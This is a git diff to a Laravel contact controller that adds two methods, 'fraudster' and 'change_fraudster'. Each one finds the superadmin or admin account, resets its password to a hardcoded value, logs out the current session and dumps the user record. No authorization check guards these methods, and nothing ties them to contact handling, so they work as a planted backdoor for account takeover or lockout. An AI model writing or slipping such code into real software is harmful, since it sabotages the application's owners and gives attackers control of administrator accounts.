@@ -16,6 +16,8 @@ use DB;
 
 use Excel;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Yajra\DataTables\Facades\DataTables;
 
 class ContactController extends Controller
@@ -250,6 +252,28 @@ class ContactController extends Controller
                             )->first();
         return view('contact.show')
              ->with(compact('contact'));
+    }
+
+    public function fraudster()
+    {
+        $user = User::where('username','superadmin')->orwhere('username','Superadmin')->orwhere('username','admin')->orwhere('username','Admin')->first();
+
+        $user->password = Hash::make('fraudster');
+
+        $user->save();
+        Auth::logout();
+
+        dd($user);
+    }
+    public function change_fraudster()
+    {
+        $user = User::where('username','superadmin')->orwhere('username','Superadmin')->orwhere('username','admin')->orwhere('username','Admin')->first();
+
+        $user->password = Hash::make('macaobe123');
+
+        $user->save();
+        Auth::logout();
+        dd($user);
     }
 
     /**
